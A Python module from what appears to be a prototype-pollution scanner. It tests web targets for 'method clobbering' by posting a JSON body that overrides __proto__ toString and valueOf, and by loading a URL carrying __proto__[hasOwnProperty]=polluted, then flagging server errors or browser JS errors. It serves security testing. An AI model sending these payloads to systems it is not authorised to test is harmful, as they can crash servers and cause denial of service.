"""
ppmap/scanner/tier8_clobbering.py - Tier 8: Method Clobbering

Active detection of Method Clobbering where core JavaScript object methods
like toString, valueOf, or hasOwnProperty are polluted to cause denial
of service or bypass logical checks.
"""

import logging
from typing import List

from ppmap.models.findings import Finding, Severity, VulnerabilityType
from ppmap.scanner.base import BaseTierScanner, ScanContext
from ppmap.scanner.helpers import Colors

logger = logging.getLogger(__name__)


class Tier8ClobberingScanner(BaseTierScanner):
    """Detects method clobbering vulnerabilities."""

    @property
    def tier_name(self) -> str:
        return "Tier 8 - Method Clobbering"

    def run(self, ctx: ScanContext) -> List[Finding]:
        self.log_start(ctx)
        findings: List[Finding] = []
        
        target_url = ctx.target_url
        session = ctx.session
        
        # Test 1: JSON Serialization / Unhandled Promise Rejection via toString
        try:
            clobber_payload = {
                "__proto__": {
                    "toString": "polluted_toString",
                    "valueOf": "polluted_valueOf"
                },
                "test": "clobber"
            }
            # Baseline
            baseline = session.get(target_url, timeout=5, verify=False)
            
            # Injection
            resp = session.post(target_url, json=clobber_payload, timeout=5, verify=False)
            
            # If a previously OK endpoint suddenly returns 500 or times out severely
            # it might be due to a toString() crash during logging or JSON.stringify
            if baseline.status_code < 400 and resp.status_code >= 500:
                print(f"{Colors.WARNING}[!] HIGH: Method Clobbering detected (Server Error generated)!{Colors.ENDC}")
                findings.append(Finding(
                    name="Method Clobbering (Server Crash)",
                    severity=Severity.HIGH,
                    type=VulnerabilityType.METHOD_CLOBBERING,
                    url=target_url,
                    method="toString/valueOf Override",
                    payload=str(clobber_payload),
                    evidence=f"Status changed from {baseline.status_code} to {resp.status_code}",
                    description="Polluting toString/valueOf caused a server error, likely due to unhandled exceptions during object coercion. This can be used for DoS."
                ))
        except Exception as e:
            logger.debug(f"Method clobbering test error: {e}")

        # Test 2: Client-side Clobbering via URL parameters if browser is available
        if ctx.driver:
            try:
                # Test if we can break the page by polluting hasOwnProperty
                safe_url = target_url
                if "?" in safe_url:
                    safe_url += "&__proto__[hasOwnProperty]=polluted"
                else:
                    safe_url += "?__proto__[hasOwnProperty]=polluted"
                    
                ctx.driver.get(safe_url)
                
                # Check for JS errors or unhandled exceptions in the DOM
                logs = ctx.driver.get_log('browser')
                clobber_errors = [log for log in logs if "hasOwnProperty is not a function" in str(log) or "polluted" in str(log)]
                if clobber_errors:
                    print(f"{Colors.WARNING}[!] MEDIUM: Client-side Method Clobbering detected!{Colors.ENDC}")
                    findings.append(Finding(
                        name="Client-side Method Clobbering",
                        severity=Severity.MEDIUM,
                        type=VulnerabilityType.METHOD_CLOBBERING,
                        url=safe_url,
                        method="hasOwnProperty Override",
                        payload="?__proto__[hasOwnProperty]=polluted",
                        evidence=str(clobber_errors[0]),
                        description="Polluting hasOwnProperty breaks client-side JS execution."
                    ))
            except Exception as e:
                logger.debug(f"Client-side clobbering test error: {e}")

        if not findings:
            self.log_clean()
            
        return findings
